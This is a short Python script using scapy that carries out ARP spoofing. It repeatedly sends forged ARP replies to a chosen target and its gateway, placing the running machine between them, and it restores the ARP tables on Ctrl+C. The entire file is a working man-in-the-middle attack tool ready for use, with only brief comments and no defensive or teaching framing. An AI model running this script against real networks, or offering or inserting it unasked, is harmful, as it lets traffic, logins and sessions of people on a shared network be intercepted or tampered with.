import scapy.all as scapy
import time
import sys
import argparse

# Show message if no arguments are passed
if len(sys.argv) == 1:
    print("[-] Please provide the required arguments. Use --help for usage information.")
    exit(1)

# Parse command-line arguments
def args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Enter the target device IP address.")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Enter the gateway IP address.")
    return parser.parse_args()

# Get MAC address for a given IP
def get_mac(ip):
    packet = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    final = broadcast / packet
    ans = scapy.srp(final, timeout=1, verbose=False)[0]
    if ans:
        return ans[0][1].hwsrc
    else:
        print(f"[-] Could not retrieve the MAC address for {ip}.")
        sys.exit(1)

# Send spoofed ARP response
def spoof(target, spoof_ip):
    mac = get_mac(target)
    packet = scapy.ARP(op=2, pdst=target, hwdst=mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# Restore original ARP table by sending correct ARP responses
def restore(destination, source):
    dmac = get_mac(destination)
    smac = get_mac(source)
    packet = scapy.ARP(op=2, pdst=destination, hwdst=dmac, psrc=source, hwsrc=smac)
    scapy.send(packet, count=4, verbose=False)

total_packets = 0
arguments = args()
try:
    print("[+] ARP spoofing has started. Press CTRL+C to stop.")
    while True:
        # Continuously send spoofed packets to both target and gateway
        spoof(arguments.gateway, arguments.target)
        spoof(arguments.target, arguments.gateway)
        total_packets += 2
        print(f"\r[+] Packets sent: {total_packets}", end="")
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    # On exit, restore ARP tables
    print("\n[!] Detected CTRL+C. Restoring the ARP tables...")
    restore(arguments.gateway, arguments.target)
    restore(arguments.target, arguments.gateway)
    print("[+] ARP tables successfully restored. Exiting.")
